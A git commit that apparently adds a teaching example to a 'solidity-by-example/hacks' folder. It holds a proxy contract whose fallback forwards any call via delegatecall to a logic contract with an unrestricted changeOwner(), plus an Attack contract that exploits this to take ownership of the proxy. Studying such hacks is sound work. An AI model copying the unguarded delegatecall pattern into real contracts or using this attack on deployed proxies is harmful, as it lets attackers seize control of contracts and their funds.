1bc073cb397f842c9c787039d725dfe7cdff5a53
ordili <qinqiqili@163.com>
2025-09-02 15:30:07 +0800

    add DelegateCallAttack

---
+++ src/solidity-by-example/hacks/DelegateCallAttack.sol
@@ -0,0 +1,37 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+contract Logic {
+    address public owner;
+    constructor(){
+        owner = msg.sender;
+    }
+    function changeOwner() external {
+        owner = msg.sender;
+    }
+}
+
+contract ProxyHackMe {
+    address public owner;
+    address public logic;
+    constructor(address logicContractAddress){
+        owner = msg.sender;
+        logic = logicContractAddress;
+    }
+    fallback() external {
+        logic.delegatecall(msg.data);
+    }
+}
+
+contract Attack {
+    address public owner;
+    address public proxyHackMeAddress;
+    constructor(address addr){
+        proxyHackMeAddress = addr;
+        owner = msg.sender;
+    }
+    function attack() external {
+        bytes memory sig = abi.encodeWithSignature("changeOwner()");
+        proxyHackMeAddress.call(sig);
+    }
+}
